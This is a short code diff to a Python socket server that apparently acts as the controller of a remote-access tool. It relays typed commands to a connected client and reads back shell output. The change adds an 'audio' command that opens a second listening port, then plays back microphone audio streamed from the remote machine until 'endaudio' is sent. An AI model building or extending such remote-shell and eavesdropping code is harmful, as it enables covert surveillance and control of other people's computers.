@@ -12,7 +12,11 @@ queue = Queue()
 HOST = ''
 PORT = 1234
 
-def audio(c):
+def audio():
+    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s1.bind(('',1235))
+    s1.listen(1)
+    c1, addr1 = s1.accept()
     chunk = 1024
     FORMAT = pyaudio.paInt16
     channels = 1
@@ -27,10 +31,13 @@ def audio(c):
                     frames_per_buffer=chunk)
 
     try:
-        while True:
-            data = c.recv(1024)
+        global flag
+        while flag:
+            data = c1.recv(1024)
             stream.write(data)
+        s1.close()
     except KeyboardInterrupt:
+        s1.close()
         pass
 
 
@@ -169,7 +176,13 @@ def connect(c):
                 continue
             elif cmd == 'audio':
                 c.send(cmd.encode())
-                audio(c)
+                global flag
+                flag = True
+                t1 = threading.Thread(target=audio)
+                t1.start()
+                continue
+            elif cmd == 'endaudio':
+                flag = False
                 continue
             c.send(cmd.encode())
             shell = c.recv(1024).decode()
